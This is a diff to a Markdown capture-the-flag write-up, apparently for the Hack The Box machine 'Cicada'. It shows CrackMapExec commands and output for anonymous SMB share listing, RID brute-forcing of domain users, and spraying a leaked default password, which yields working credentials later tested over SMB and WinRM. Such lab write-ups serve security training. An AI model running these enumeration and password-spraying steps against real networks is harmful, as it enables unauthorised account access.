@@ -137,7 +137,7 @@ To start enumerating this service, we'll run a basic [CrackMapExec](https://gith
 <br />
 
 ```bash
-❯ cme smb 10.10.11.35
+❯ cme smb cicada.htb
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 ```
 
@@ -152,7 +152,7 @@ To continue enumerating, we'll try to list `shared resources` using a fake usern
 <br />
 
 ```bash
-❯ cme smb 10.10.11.35 -u 'RandomFakeUsername' -p '' --shares
+❯ cme smb cicada.htb -u 'RandomFakeUsername' -p '' --shares
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\RandomFakeUsername: 
 SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
@@ -232,10 +232,12 @@ The most relevant detail in the output, is the company default password: `Cicada
 
 With this information, we can try to enumerate users with CrackMapExec’s  `--rid-brute` flag and see if any of them are still using the default password.
 
+
+
 <br />
 
 ```bash
-❯ cme smb 10.10.11.35 -u 'RandomFakeUsername' -p '' --rid-brute
+❯ cme smb cicada.htb -u 'RandomFakeUsername' -p '' --rid-brute
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\RandomFakeUsername: 
 SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
@@ -296,7 +298,7 @@ Now, we can try the `default password` against each user in the file:
 <br />
 
 ```bash
-❯ cme smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+❯ cme smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
@@ -308,5 +310,31 @@ SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrigh
 
 We've obtained valid credentials: `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
 
+### michael.wrightson:
+
 <br />
 
+This credentials work for SMB:
+
+<br />
+
+```bash
+❯ cme smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+```
+
+<br />
+
+But they didn't work for WINRM:
+
+<br />
+
+```bash
+❯ cme winrm cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+SMB         10.10.11.35     5985   CICADA-DC        [*] Windows 10.0 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
+HTTP        10.10.11.35     5985   CICADA-DC        [*] http://10.10.11.35:5985/wsman
+HTTP        10.10.11.35     5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+```
+
+<br />
